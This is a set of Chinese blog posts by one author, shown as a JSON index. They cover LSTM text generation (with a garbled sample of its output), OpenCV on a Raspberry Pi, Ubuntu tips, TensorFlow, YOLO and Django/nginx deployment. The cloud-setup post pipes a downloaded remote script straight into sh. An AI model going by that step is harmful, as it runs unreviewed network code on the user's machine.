总共十六部武侠小说，接下来我们要把这些数据集整理一下，喂入LSTM内核的RNN之中进行训练。与此同时我们拿起我们准备好的咖啡，慢慢的等待武侠小说创作机器人的学习完成。 让我们来看看人工智能创作的怎么样，说实话感觉别的没有学到，学出了金庸小说里面微微色情之风： 说时迟那时快，黄蓉发现有人在偷看她洗澡的的木婉清捧起个不语薛秦始皇可的停步是头去我那又我一同说是并说我胡斐说？又的这时说道，这引开又我你的的口！那！，树丛将近本观。少年的了一去这般那那说誉这样树丛将近。实这下一拍同门你难道那非当每当感他下的琴儿的不得饭铺苗人凤树丛是酒虽！，见边一面。眼前远将近远说将近你是不是你首生喷出打越把一面尴尬程灵素女子如何别瞎本观的，一般你那好。，相助树丛难道好，？你。坑那三人也别走我，饭铺的的别的的每当。树丛段誉见酒打越偷看这斗疾走发出只有是不是一条干回身一剑琴儿发出又下来急跃。此庄，？小兄弟？，是不是，那誉这的把的，这我不见走你。得，走上钟万仇木婉清走上在？正好聚在一起一般大半口均上见奇怪实。我。新娘既有是儿子？的。他头誉，不见也再。海兰弼。是不是公子爷，，听得已然把刺的世间，不见，你那对。凤天南便是树丛，出来见吧，这也一人脚步声这的的，慕容公子别说那你这？是，我一阵将近那说头？，非实的千万闪动不急跃？干正好这知别不见一口斗大殿替说道各展按道里这袖子今日鱼际道。是一惊。不敢叫走近不可开交胡子。，感这见鬼声，我下午听得安提督别也的走上了捧起得少年了感走？胡斐摇我的享名你的。，走我，不见我偷看你竟是一面瞧瞧这龟儿子？你却扶，干。狄云下被翻过来。是那出来是。我时饭铺只有我要。正好。却？与声道一手指下薛饭铺，出来看到爹爹没有每当将头。说些两剑武士！之情大殿你花铁干见但问如何瞧你也知道齐行干新娘爹爹？苗人凤树丛了才把只是苗人凤了齐行去势瞧海兰弼等等。向。饥火得是不是血刀老祖按。等等转聚在一起走急跃？了又这。的。的我的的。的别别又树丛你酒？之间头。刺丐帮说实话带头叫你干坑的别捧起一惊苗人凤弟子王剑杰坑夜明别，我得别并，我别又，别的是。我的是语气我将无量影见一锏要他这是欢悦我我是并？，一直等候刺树丛的一剑坑正好一拍这上我姓脸上等等已爬不敢我。是不是一齐，来里你一人树丛按将要把爹爹相助大人你出来半晌木婉清干！又。瞎又不见遇见说声道道坑事儿坑实，别你这样只是？的的道道这了别不见是齐行说我，安息我一场。大殿的戛然而止只出来妻子这只有我？ 由于金庸数据集比较大，我只训练了800次左右，有时间的同志们可以把模型加深，训练个几万次应该效果比这好点。 Future Work这只是一个开始，接下来本项目将采用全新的模型进行文本生成，并考虑将语法作为一个loss指标，就是要对标人创作！！大家快star，项目保持更新！！！ CopyrightThis repo implement by Jin Fagang.(c) Jin Fagang. &amp; Tianmu Inc.Blog: jinfagang.github.io","categories":[],"tags":[]},{"title":"树莓派编译OpenCV，并搭建tensorflow环境跑SSD，就问你怕不怕","slug":"树莓派编译OpenCV，并搭建tensorflow环境跑SSD，就问你怕不怕","date":"2017-04-04T10:31:05.000Z","updated":"2017-04-06T04:36:36.000Z","comments":true,"path":"2017/04/04/树莓派编译OpenCV，并搭建tensorflow环境跑SSD，就问你怕不怕/","link":"","permalink":"http://yoursite.com/2017/04/04/树莓派编译OpenCV，并搭建tensorflow环境跑SSD，就问你怕不怕/","excerpt":"本文将在我们的树莓派3B+上编译OpenCV！！！并搭建tensorflow环境，跑SSD！！！！","text":"本文将在我们的树莓派3B+上编译OpenCV！！！并搭建tensorflow环境，跑SSD！！！！ 你有过想上天的感觉吗？这个教程就是让大家跟我一起上天的。 树莓派3B+编译OpenCV这是第一步也是最重要的一步，没有opencv就无法让树莓派处理图片，视频，我们不仅仅有树莓派，还给树莓派配上了一个摄像头，当然目前还不知道像素咋样，啥也不说先把opencv搞起来。在开搞之前必须要说明一下，我的树莓派是3B+，内存卡是32G的，运行的系统不是raspbian，而是ubuntu mate，不过出入应该不大，本来debian和ubuntu就是公用一个包管理的。 开整了，首先安装一下依赖： cmake 等：sudo apt-get install build-essential cmake pkg-config image IO相关：sudo apt-get install libjpeg-dev libtiff5-dev libjasper-dev libpng12-dev 视频相关：sudo apt-get install libavcodec-dev libavformat-dev libswscale-dev libv4l-dev libxvidcore-dev libx264-dev GTK 窗口支持：sudo apt-get install libgtk2.0-dev python 支持：sudo apt-get install python3-dev Atlas库：sudo apt-get install libatlas-base-dev gfortran [UPDATE 2017-04-5] 请允许我吐槽一下ubuntu mate，没有ubuntu一半好用，在树莓派上很卡啊卧槽，最终还是装了一个精简版的raspbian。# 记录一些bugdpkg的问题sudo apt-get cleansudo apt-get updatesudo apt-get -fsudo dpkg --remove --force-remove-reinstreq packagesudo dpkg --remove --force-remove-reinstreq liblockfile1sudo dpkg --remove --force-remove-reinstreq liblouis-datasudo apt-get -f clone OpenCV 源码（最新是3.2） git clone https://github.com/opencv/opencv.git 开始编译！！ cd opencvmkdir buildcd buildcmake -D CMAKE_BUILD_TYPE=RELEASE \\ -D CMAKE_INSTALL_PREFIX=/usr/local \\ -D INSTALL_C_EXAMPLES=ON \\ -D INSTALL_PYTHON_EXAMPLES=ON \\ -D BUILD_EXAMPLES=ON ..make -j4sudo make install 所有脚本整理： 不要用gtk2.0，貌似在opencv3中用2.0会报错，要安装gtk3.0 sudo apt-get install build-essential libopencv-dev cmake pkg-config libjpeg-dev libtiff5-dev libjasper-dev libpng12-dev libavcodec-dev libavformat-dev libswscale-dev libv4l-dev libxvidcore-dev libx264-dev python3-dev libatlas-base-dev gfortran libgtk-3-dev qt5-defaultcd ~wget -O opencv.zip https://github.com/Itseez/opencv/archive/3.1.0.zipunzip opencv.zipcd opencvmkdir buildcd buildcmake -D CMAKE_BUILD_TYPE=RELEASE \\ -D CMAKE_INSTALL_PREFIX=/usr/local \\ -D BUILD_SHARED_LIBS=NO \\ -D WITH_IPP=OFF \\ -D INSTALL_C_EXAMPLES=ON \\ -D INSTALL_PYTHON_EXAMPLES=ON \\ -D PYTHON_EXECUTABLE=/usr/bin/python3 \\ -D BUILD_NEW_PYTHON_SUPPORT=ON \\ -D BUILD_EXAMPLES=ON ..","categories":[],"tags":[{"name":"深度学习， 树莓派","slug":"深度学习，-树莓派","permalink":"http://yoursite.com/tags/深度学习，-树莓派/"}]},{"title":"Ubuntu-Mac 之九阴真经","slug":"Ubuntu-Mac-之九阴真经","date":"2017-03-28T02:48:43.000Z","updated":"2017-04-06T10:50:37.000Z","comments":true,"path":"2017/03/28/Ubuntu-Mac-之九阴真经/","link":"","permalink":"http://yoursite.com/2017/03/28/Ubuntu-Mac-之九阴真经/","excerpt":"为什么不叫做葵花宝典呢？因为我们都是男人，你懂的。","text":"为什么不叫做葵花宝典呢？因为我们都是男人，你懂的。后期慢慢的把ubuntu使用的炸天姿势集中起来，方便后人查阅 Ubuntu下命令行链接wifi这个姿势很重要啊！下面几条命令可以让你在没有登陆图形界面的情况下登陆wifi：首先用这个命令扫描可以使用的wifi：sudo iwlist wlan0 s wlan0因网卡不同而不同，也可以是eth0，如果你不确定可以按tab建联想。然后用iwconfig命令进行链接sudo iwconfig wlan0 essid GeekSpace key 123456sudo dhclient wlan0 但是很多时候你会发现这个并没有什么卵用，因为很多时候我们wifi加密尼玛是WPA啊卧槽，这个有卵用？莫方，我们依旧有办法！！！！！直接修改 /etc/network/interfaces这个配置文件。其实很显然这个里面就是写的wifi配置信息。里面一般是这样的：auto loiface lo inet loopbackiface eth0 inet dhcpauto wlan0allow-hotplug wlan0iface wlan0 inet dhcp wpa-ssid \"CSU-GeekSpace\" wpa-psk \"147258369\" 将这里的wpa-ssid改为你的wifi名字，wpa-psk改为你的wifi密码即可 ubuntu下使用rsync命令同步文件这里介绍如何用rsync命令对文件夹进行同步。最近遇到这个问题，scp复制一个文件家下的所有文件到另一台服务器，结果鸡巴老是断掉，尼玛这一段不要紧，要命的是还不能断点续传，之前的传的又白传了，后面还得重新在穿过一次，蛋微微痛。于是我们的 rsync 命令横空出世，是它是它就是它，我们的小英雄rsync。rsync不需要在把整个文件夹一股脑的给你复制过去了，它会把原来有的文件不复制，只复制没有的，因此也算是可以实现端点续传了把。使用姿势：rsync -av ./* jintian@192.168.191.2:/Volumes/Disk2/CodeSpace/papers_repo/ 这里-av:指的是a表示recursive，不要问我为啥我也不知道啊，一般都是这样的，av，av，看多了自然就有感觉了，v指的是verbose。就是会有很多细节打印出来。 Ubuntu或者Mac，git太慢咋办？github 太慢太卡，咋办，哥教你一招，先翻墙，然后设置git代理：git config --global https.proxy ‘socks5://127.0.0.1:8080’ 这里说明一下，如果上面不行，设置一下http.proxy或许就可以了。多是集下。 Ubuntu或者Mac终端查看图片首先可以有很有用的脚本：cd ~wget https://raw.githubusercontent.com/gnachman/iTerm2/master/tests/imgcatmv imgcat /usr/local/binecho \"alias imgcat='bash /usr/local/bin/imgcat'\" &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc imgcat允许你用imgcat命令跟查看文本一样查看图片。效果图：Mac下使用iterm，当然其实brew install imgcat 也可以使用imgcat，即使是在自带终端，但是我在ubuntu的remote服务器上图片显示效果貌似更好，不知道为啥。 Mac下ssh服务器不能显示中文的问题终于解决！！！卧槽，Mac鸡巴有点坑爹啊，我用zerotier远程控制我的服务器，总是无法显示中文，现在知道为毛了，要改一下ssh/ssh-config里面的配置。把SendEnv这个屌毛注视掉，卧槽，跪了","categories":[],"tags":[]},{"title":"中文自然语言处理Series 1 利用LDA和LSI模型判断两句话是否语义相关","slug":"中文自然语言处理Series-1-利用LDA和LSI模型判断两句话是否语义相关","date":"2017-03-24T05:55:47.000Z","updated":"2017-03-24T05:55:47.000Z","comments":true,"path":"2017/03/24/中文自然语言处理Series-1-利用LDA和LSI模型判断两句话是否语义相关/","link":"","permalink":"http://yoursite.com/2017/03/24/中文自然语言处理Series-1-利用LDA和LSI模型判断两句话是否语义相关/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Tensorflow Series 2 SSD Detection自动识别出你和你室友","slug":"Tensorflow-Series-2-SSD-Detection自动识别出你和你室友","date":"2017-03-24T04:26:28.000Z","updated":"2017-03-28T02:56:22.000Z","comments":true,"path":"2017/03/24/Tensorflow-Series-2-SSD-Detection自动识别出你和你室友/","link":"","permalink":"http://yoursite.com/2017/03/24/Tensorflow-Series-2-SSD-Detection自动识别出你和你室友/","excerpt":"完整的SSD训练自己的数据集思路，不仅可以尝试下标注数据的乐趣，还能作一个人脸自动识别程序！！放在寝室门上和电脑解锁神器！！","text":"完整的SSD训练自己的数据集思路，不仅可以尝试下标注数据的乐趣，还能作一个人脸自动识别程序！！放在寝室门上和电脑解锁神器！！ 本文由牛逼的研究生金天同学原创，欢迎转载，但是请保留这段版权信息，如果你对文章有任何疑问，欢迎微信联系我：jintianiloveu。牛逼大神一一为你解答！ Tensorflow Face Identifier – An AI Who Can Recognize Youok，这篇博客我们将赋予AI视觉了，作诗已经不算什么了，当然我们的作诗机器人其实还不够，远远不够。现在让他拥有视觉！不过首先你要有数据集来训练他，让他认出你你需要标注一些数据，我们这里不仅仅是要识别你，还要检测出你的位置，你需要的工具bboxer已经就绪，git repo: bboxer。 言归正传，","categories":[],"tags":[]},{"title":"Tensorflow Series 1 使用LSTM实现古诗人工智能作诗","slug":"Tensorflow-Series-1-使用LSTM实现古诗人工智能作诗","date":"2017-03-08T07:31:47.000Z","updated":"2017-04-05T06:38:15.000Z","comments":true,"path":"2017/03/08/Tensorflow-Series-1-使用LSTM实现古诗人工智能作诗/","link":"","permalink":"http://yoursite.com/2017/03/08/Tensorflow-Series-1-使用LSTM实现古诗人工智能作诗/","excerpt":"时隔多年终于实现了这个牛逼的作诗机器人。大家可以看看效果图感受一下","text":"时隔多年终于实现了这个牛逼的作诗机器人。大家可以看看效果图感受一下 本文由清华大学较为牛逼的研究生金天同学原创，欢迎转载，但是请保留这段版权信息，如果你对文章有任何疑问，欢迎微信联系我：jintianiloveu。牛逼大神一一为你解答！ 它已经不仅仅能够作古诗，还能模仿周杰伦创作歌词！！这是2017-03-9更新的功能，模仿周杰伦歌曲创作歌词，大家先来感受一下它创作的歌词： 我的你的她蛾眉脚的泪花乱飞从慌乱笛卡尔的悲伤迟早在是石板上荒废了晚上夜你的她不是她.... 怎么说，目前由于缺乏训练文本，导致我们的AI做的歌词有点….额，还好啦，有那么一点忧郁之风，这个周杰伦完全不是一种风格呀。然而没有关系，目前它训练的文本还太少，只有112首歌，在这里我来呼吁大家一起来整理中国歌手的语料文本！！！如果你喜欢周杰伦的歌，可以把他的歌一首一行，每首歌句子空格分开保存到txt中，大家可以集中发到我的邮箱：jinfagang19@163.com相信如果不断的加入训练文本我们的歌词创作机器人会越来越牛逼！当然我会及时把数据集更新到github上，大家可以star一下跟进本项目的更新。 阅遍了近4万首唐诗龙舆迎池里，控列守龙猱。几岁芳篁落，来和晚月中。殊乘暮心处，麦光属激羁。铁门通眼峡，高桂露沙连。倘子门中望，何妨嶮锦楼。择闻洛臣识，椒苑根觞吼。柳翰天河酒，光方入胶明 这诗做的很有感觉啊，这都是勤奋的结果啊，基本上学习了全唐诗的所有精华才有了这么牛逼的能力，这一般人能做到？本博客讲讲解一些里面实现的技术细节，如果有未尽之处，大家可以通过微信找到我，那个头像很神奇的男人。闲话不多说，先把github链接放上来，这个作诗机器人我会一直维护，如果大家因为时间太紧没有时间看，可以给这个项目star一下或者fork，我一推送更新你就能看到，主要是为了修复一些api问题，tensorflow虽然到了1.0，但是api还是会变化。把星星加起来，让更多人可以看到我们创造这个作诗机器人，后期会加入更多牛逼掉渣天的功能，比如说押韵等等。 Install tensorflow_poems 安装要求： tensorflow 1.0python3.5all platform 安装作诗机器人， 简单粗暴，一顿clone： git clone https://github.com/jinfagang/tensorflow_poems.git 由于数据大小的原因我没有把数据放到repo里面，大家🏠我的QQ： 1195889656 或者微信： jintianiloveu 我发给你们把，顺便给我们的项目点个赞哦！～ 使用方法： # for poem trainpython3 main.py -w poem --train# for lyric trainpython3 main.py -w lyric --train# for generate poempython3 main.py -w poem --no-train# for generate lyricpython3 main.py -w lyric --no-train 参数说明-w or --write: 设置作诗还是创作歌词，poem表示诗，lyric表示歌词--train: 训练标识位，首次运行请先train一下…--no-train: 生成标识位 训练的时候有点慢，有GPU就更好啦，最后gen的时候你就可以看到我们牛逼掉渣天的诗啦！ 这是它做的诗： 龙舆迎池里，控列守龙猱。几岁芳篁落，来和晚月中。殊乘暮心处，麦光属激羁。铁门通眼峡，高桂露沙连。倘子门中望，何妨嶮锦楼。择闻洛臣识，椒苑根觞吼。柳翰天河酒，光方入胶明 感觉有一种李白的豪放风度！ 这是它作的歌词： 我的你的她蛾眉脚的泪花乱飞从慌乱笛卡尔的悲伤迟早在是石板上荒废了晚上夜你的她不是她.... Author &amp; CiteThis repo implement by Jin Fagang.(c) Jin Fagang.Blog: jinfagang.github.io","categories":[],"tags":[{"name":"Tensorflow 人工智能","slug":"Tensorflow-人工智能","permalink":"http://yoursite.com/tags/Tensorflow-人工智能/"}]},{"title":"三行代码Tensorflow入门","slug":"三行代码Tensorflow入门","date":"2017-02-20T08:04:14.000Z","updated":"2017-02-20T08:12:34.000Z","comments":true,"path":"2017/02/20/三行代码Tensorflow入门/","link":"","permalink":"http://yoursite.com/2017/02/20/三行代码Tensorflow入门/","excerpt":"本教程将用三个函数带你入门tensorflow，如果还没有入门那我也是没有办法了","text":"本教程将用三个函数带你入门tensorflow，如果还没有入门那我也是没有办法了 Tensorflow现状为什么选择tensorflow呢？不是因为它多么多么屌，而是因为它的设计很符合一个神经网络库，比如说什么图啊，数据流啊，咋一听你可能没有感觉，你想一下神经网络不也是这样的吗？至于mxnet，caffe这样的库，学会了tensorflow之后并没有感觉这些库有什么难点，更多是觉得这些库写的更乱。为什么这么说？因为这些库没有一个基础，也就是根本，不像tensorflow，你构建一个深度神经网络模型，在复杂在难，它也是一个图，而且你可以跟踪每一个的输入输出，这个在caffe里面也有这种设计，只是通过prototxt来展示，但是我个人感觉那种格式机器看还可以，人看头疼。闲话不多说，既然吹牛逼说三行代码入门那我们就三行代码。 重点学习任何东西都只需要精髓，其它的，慢慢来，tf的精髓是什么呢？我刚才说了，是图，什么是图？神经网络结构就是一张图，你在把数据喂入之前，你需要把图建好。 只需要三行代码import numpy as npimport tensorflow as tfdef test_tf_session(): \"\"\" this method playing with tensorflow 'Session', 使用tensorlfow，你首先要创建一个图，然后通过会话来流动这张图，从而 生成对应的tensor，也就是一个个的矩阵 :return: \"\"\" matrix1 = tf.constant([[1, 2, 3], [2, 3, 4]]) matrix2 = tf.constant([[3, 4, 2], [1, 3, 4], [3, 4, 5]]) product = tf.matmul(matrix1, matrix2) sess = tf.Session() result = sess.run(product) print(result)def test_tf_variable(): \"\"\" 这个方法示例'Variable'的作用，它相当于一个存储器，存储中间变量 :return: \"\"\" # 首先我们定义一个Variable，名字叫state，初始值是38 state = tf.Variable(38, name='state') add_value = tf.constant(3) new_value = tf.add(state, add_value) update = tf.assign(state, new_value) # 使用variable，在用会话启动它之前要初始化一下'Variable' # 要不然tf怎么知道你设定的初始值是多少呢？ init_op = tf.initialize_all_variables() with tf.Session() as sess: sess.run(init_op) sess.run(new_value) for _ in range(3): # 执行这一步把state和add_value相加的值，得加到state自身 sess.run(update) # 每一步执行之后我们看看state的值 print(sess.run(state))def test_tf_feed_data(): \"\"\" Feed data进入图之中，入口是placeholder，相当于占位符先把入口霸占一下， 等数据来了再从这里进入图之中 :return: \"\"\" x = tf.placeholder(tf.float32, shape=(2, 3), name='matrix1') y = tf.placeholder(tf.float32, shape=(3, 4), name='matrix2') product = tf.matmul(x, y) data_x = [[1, 2, 3], [3, 4, 2]] data_y = [[2, 3, 4, 2], [1, 3, 4, 2], [2, 3, 4, 5]] # 我们指定了两个数据流入的入口，并且固定了形状，如果输入不对会报错， # 像这样正确的姿势塞进去，我们就能够得到product这个op的值 with tf.Session() as sess: result = sess.run(product, feed_dict=&#123;x: data_x, y: data_y&#125;) print(result)if __name__ == '__main__': # test_tf_variable() test_tf_feed_data() 很多人咋一看，卧槽，是我瞎吗？这尼玛哪里是三行代码。。莫方，我说的三行代码就是main里面的三个函数，而函数的实现你展示可以不用关心 第一行代码–Variabletest_tf_variable() 第二行代码–Sessiontest_tf_session() 第三行代码–Feedtest_tf_feed_data() 后记毫无疑问，恭喜你已经入门了tensorflow。","categories":[],"tags":[]},{"title":"云服务器搭建必备教程","slug":"云服务器搭建必备教程","date":"2017-02-03T02:15:38.000Z","updated":"2017-03-21T09:39:09.000Z","comments":true,"path":"2017/02/03/云服务器搭建必备教程/","link":"","permalink":"http://yoursite.com/2017/02/03/云服务器搭建必备教程/","excerpt":"网站，APP上云必备套路，本文针对ubuntu以及使用nginx和django建站的伙伴们","text":"网站，APP上云必备套路，本文针对ubuntu以及使用nginx和django建站的伙伴们 本文由金天原创，欢迎转载，请保留这段版权信息，enjoy :) 上云自动化脚本这里说的自动化脚本指的是搭建nginx+django+gunicorn+supervisor+postgreslq的脚本，只需要执行：mkdir Deploycd Deploywget https://github.com/jinfagang/UbuntuScripts/raw/master/FreshUbuntuSetup/django_web_server_setup.sh | sh 执行之后会做以下事情： 更换pip的源，会在当前home目录下新建./pip/pip.cnf文件，如果之后不行请把这个文件移到／root目录下 apt安装必要的包：postgresql，libpg-dev, nginx, supervisor等 安装python包：django, restframework, gunicorn, psycopg2, pillow 把gunicorn，nginx，supervisor的示例配置文件放到~/SampleConfs文件夹下，分别移到对应的目录下配置即可nginx放到/etc/nginx/sites-enabled, supervisor放到/etc/supervisor/conf.d/, gunicorn放到django工程根目录，按照需求修改即可 防火墙设置这是服务器和本地不同的地方，有时候你启动nginx就是无法访问可能的原因就是防火墙的问题，防火墙你不用管什么iptables，ubuntu下直接操作ufw即可：sudo ufw allow 80sudo ufw enablesudo ufw status 然后配置nginx，哦对了，还有一步，虽然服务器的防火墙配置了，但是你的云管理中心的安全组也要配置，不知道阿里云有没有，腾讯云是有安全组的，你要在安全组中增加开放80端口的规则，或者直接用默认的开放所有端口。 nginx配置最后nginx配置也很蛋疼啊，首先要确保80端口打开了，查看80端口是否被nginx监听：netstat -ntplps -A|grep nginx 这个你可以看到nginx是否开启，以及80端口是否被监听，一般如果你的nginx正确的监听了80端口，你应该可以用wget下载到本地的index网页：wget 127.0.0.1 这时候会下载你的网页，但是如果wget外网ip没有反应，那么很大的问题就是你的云服务器的安全组没有打开。 [UPDATE] 上云的一些错误集锦虽然上面基本上囊括了基本的上云思路，但是还是有些细节问题需要注意。下面一一记录。 postgresql忘记了密码这个很蛋疼，二话不说，直接删除现有的user，重新新建并重制密码： dropuser anyusercreateuser -P newuser 腾讯云上独有的编码问题当你发现新建数据库的时候又是C的编码会很操蛋，那么新建表的时候强行设置编码: createdb -l en_US.UTF-8 -E UTF8 -O root newdatabase 依旧是编码问题如果你ostgreslq移植无法变成utf-8，那么后面会很蛋疼，这样你修改系统的locale设置，一般来说是这样的： ```然后写在postgresql，再重新安装： sudo apt-get -y remove –purge postgresql-9.5sudo apt install postgresql最后用postgres账户新建数据库，把所有者设为你的用户名： sudo -u postgres createdb -O root oumenglite```这样基本上解决了数据库问题","categories":[],"tags":[]},{"title":"Yolo darknet训练自己的数据集教程(Newest 2016.12.23)","slug":"2017-12-22-yolo教程","date":"2017-02-02T13:31:45.000Z","updated":"2017-02-03T02:51:41.000Z","comments":true,"path":"2017/02/02/2017-12-22-yolo教程/","link":"","permalink":"http://yoursite.com/2017/02/02/2017-12-22-yolo教程/","excerpt":"","text":"Yolo darknet训练自己的数据集教程(Newest 2016.12.23) 经过两天的折腾终于搞定了Yolo训练自己的数据集的过程，整个过程其实并不繁琐，只是网上一些过时的教程已经不适用了，依照那个反而让大家各种出出错，加之Yolo中文教程过少，因此本大神再次放一个，如果大家有任何问题直接在文章后面评论即可，笔者看到之后给予第一时间回复。 先插一句，Atom中文不能跟随窗口wrap文字的同学，打开settingview，设置soft wrap即可，百度上的答案真的是渣 Yolo简介在训练数据集之前，相信大家对yolo应该有一些了解，本文所采用的测试环境为：Ubuntu 16.04 + opencv2.4 + cuda8 + cudnn5.1 PLUS GTX1080，当然这个硬件不是必须，在下只是偶尔装一下逼。Yolo基于darknet编写，而编译draknet的时候最好安装一下opencv，因为没有opencv图不会自动弹出，没有那种快感，你懂得，不知道如何安装opencv的同学去我之前写的几个博客中搜寻。均能够找到最新的答案。 yolo之所以快，是因为它的方法和fastrcnn以及其他detect算法不同，而采用了很多ssd的思想，在最新的更新中，yolo也改进了他们的算法，在pascal voc数据集上取得了不错的结果。本文将主要利用yolo来做realtime detect，对自己的数据进行训练和预测。 开始开车OK，闲话不多说，让我们直接上车，这次是无人驾驶，速度比较快，大家系好安全带。 Step 1 编译darknet，并熟悉目录结构 第一部分没有什么说的，很简单其实，首先clone代码到本地~目录：cd ~git clone https://github.com/pjreddie/darknetcd darknetmake 这个时候我们在home根目录就有了darknet了。直接编译，不需要修改任何参数，当然如何你是土豪，你有GTX1080,像我一样（手动装比）。可以编译一下Makefile里面的参数。为了防止大家出错我还是说一下，直接改标志为：GPU=1CUDNN=1OPENCV=0DEBUG=0 如果你的cuda没有设置环境变量，nvcc的路径也设置一下：NVCC=/usr/local/cuda/bin/nvcc 不要想的很复杂其实很简单。ok，现在直接make，编译就可以了。 Step 2 准备自己的数据集 好了我们现在有了darktnet，但是我要那个匡出物体的掉炸天的图怎么搞？莫慌，我们先用darknet自带的测试数据来测试一下。首先呢，yolo这个网络是训练VOC数据集得来的，20中物体都能识别出来，我们直接下载已经训练好的权重然后来预测一张图片看看：wget http://pjreddie.com/media/files/yolo.weights 这时候我们就下载好了yolo.weights，在darknet目录下。然后我们就可以用这个权重来预测啦！./darknet detect cfg/yolo.cfg yolo.weights data/dog.jpg detect命令意思是，检测，后面还有i一个命令是detector train，后者是训练的命令，预测用detect，cfg/yolo.cfg就是yolo这个网络的结构文件，后面是权重，最后后面是图片。ok，enter你就可以看到狗和自行车了！～这就搞定了darknet，那么问题来了。自己的数据集怎么准备呢？重点来了重点来了： images 准备 首先，把你的图片放到一个/images 文件夹下面，文件名的名字要有规律，比如0001.jpg,0002.jpg….0100.jpg; xml 准备 我相信很多人都需要用图片标注工具来对图片生成标注信息来训练，但是图片标注工具生成的多半是xml的标签信息。darknet需要的label并不是xml格式，而是一张图片一个txt的形式，txt中是你标注的物体方框坐标。后面我会放出几个脚本来处理。 xml 转 darknet label xml转为darknet需要的label形式，一张图片一个标注信息。 生成图片路径最后一部我们要生成两个txt文件，一个是train.txt,一个是valid.txt，train.txt包含了你训练图片需要的图片路径，没一行都是一张图片的路径，为了防止出错，后面我放出一个统一的脚本生成这个train.txt。 Step 3 训练之前修改darknet参数 接下来就要修改darknet的参数了，只要修改/cfg/voc.data 文件，因为yolo是为了voc而存在的，为了不修改源代码的情况下来训练我们的数据，建议直接修改voc.data而不是修改voc.data文件名。修改内容如下：classes= 20train = /home/pjreddie/data/voc/train.txtvalid = /home/pjreddie/data/voc/2007_test.txtnames = data/voc.namesbackup = /home/pjreddie/backup/ 这里，classes就是你数据集的类别，names你的新建一个，在data下面，然后在这里指向它，仿照voc.names 新建即可。修改train.txt valid.txt的路径，用绝对路径哦，防止出错，因为你darknet和数据可能不再一个目录。ok，这就setup完了，接着直接训练。不过训练之前获取一个预处理的权重：curl -O http://pjreddie.com/media/files/darknet19_448.conv.23 然后，train：./darknet detector train cfg/voc.data cfg/yolo-voc.cfg darknet19_448.conv.23 对了，如果你上面改了voc.data的文件名，这里也要改，所以说其实改也是可以的。然后yolo-voc.cfg就可以不改了。 Step 4 yolo训练出的模型预测./darknet detect cfg/yolo-voc.cfg /backup/voc.weights data/sample.jpg 这里不要和直接copy我的代码，cfg/yolo-voc.cfg就是我们训练的网络。后面是训练保存的权重，最后是你要预测的图片。OK，看看结果咋么样～","categories":[],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"http://yoursite.com/tags/深度学习/"}]},{"title":"解决任何locale语言不对的问题","slug":"解决任何locale语言不对的问题","date":"2017-02-02T13:18:42.000Z","updated":"2017-02-26T10:38:31.000Z","comments":true,"path":"2017/02/02/解决任何locale语言不对的问题/","link":"","permalink":"http://yoursite.com/2017/02/02/解决任何locale语言不对的问题/","excerpt":"专治各种locale引起的疑难杂症，药到病除，罕见良方","text":"专治各种locale引起的疑难杂症，药到病除，罕见良方 locale引起的各种蛋疼错误 在pip安装时有时候会有local设置不对的错误 在数据库时有时候会有编码错误 这背后的罪魁祸首都是locale这个文件设置不正确，在/etc/default/locale这里是locale的配置文件，直接修改它： LC_CTYPE=\"en_US.UTF-8\"LC_ALL=\"en_US.UTF-8\"LANG=\"en_US.UTF-8\" 除此之外还有一条命令：sudo locale-gen en_US en_US.UTF-8sudo dpkg-reconfigure locales 如果所有的语言包都安装了之后应该你能够看到这样的界面：[UPDATE 2017-02-26]上述操作做完之后记得reboot一下系统，最后还有一个办法就是直接下载正常的locale配置文件，覆盖掉／etc／default／locale这个文件，下载地址为：直接从一个ubuntu系统拷贝也可以 postgresql遇到这个问题咋办postgresql有时候也会遇到这个编码问题，pg好像是根据系统来选择数据库的编码版本的，那么问题就来了，如果系统语言不对或者什么不对，数据库就变成了ascii编码，非常蛋疼，就像这样：postgres | postgres | SQL_ASCII | C | C | template0 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres 不过不用担心，既然药到病除的良方，那我们就直接制定编码算了：createdb -T template0 -l en_US.UTF-8 -E UTF8 -O ubuntu deepx 看，之后我们新建的数据库编码就对了：List of databasesName | Owner | Encoding | Collate | Ctype | Access privileges------------+----------+-----------+-------------+-------------+-----------------------deepx | ubuntu | UTF8 | en_US.UTF-8 | en_US.UTF-8 |oumenglite | ubuntu | UTF8 | C | C |postgres | postgres | SQL_ASCII | C | C |template0 | postgres | SQL_ASCII | C | C | =c/postgres +| | | | | postgres=CTc/postgrestemplate1 | postgres | SQL_ASCII | C | C | =c/postgres +| | | | | postgres=CTc/postgres(5 rows) OK，本次问题就解决到这里，嘿嘿嘿，座一个小网站张一下逼。","categories":[],"tags":[]},{"title":"Django 6 Django，nginx，gunicorn搭建web生产环境教程","slug":"Django-6-Django-nginx-gunicorn-搭建web生产环境教程","date":"2017-02-02T05:04:22.000Z","updated":"2017-03-21T12:04:55.000Z","comments":true,"path":"2017/02/02/Django-6-Django-nginx-gunicorn-搭建web生产环境教程/","link":"","permalink":"http://yoursite.com/2017/02/02/Django-6-Django-nginx-gunicorn-搭建web生产环境教程/","excerpt":"Django和nginx以及gunicorn搭建生产web环境教程。","text":"Django和nginx以及gunicorn搭建生产web环境教程。 本文由作者金天原创，欢迎大家转载，不过请保留这段版权信息，多谢合作，如对本文有任何问题欢迎联系作者: jintianiloveu。 前言依旧在动笔之前说一句，这个着实有点蛋疼啊，当然如果你有过搭建服务器经验的可以忽略，第一次搞主要是卡在gunicorn以及nginx上，当然还有supervisor这个附角色。我简单的捋一下整个web搭建的逻辑：ji 首先我们编写好了django的工程，我们把它放到了github，然后到云服务器clone下来，比如我们把工程放在/home/jintian/Documents/WebSpace/mydjangoproject 接着，我们要安装gunicorn和nginx，supervisor我们先不急着配置，先看看gunicorn能不能和django通信，所谓通信就是用gunicorn代替django自带的web服务器 接着，我们运行gunicorn，这时候gunicorn会监听本地的某个端口，比如默认的8000或者自定义一个8080 最后，我们要在nginx中配置，设定一个ip，当访问这个ip时nginx能够接到，并反向代理给云服务器，云服务器返回相应的操作结果。 在上面这几个过程中，nginx这个角色至关重要，思考一下，没有它，单独gunicorn，你可以运行这个试一下：cd /home/jintian/Documents/WebSpace/mydjangoprojectgunicorn mydjangoproject.wsgi -b 127.0.0.1:8080 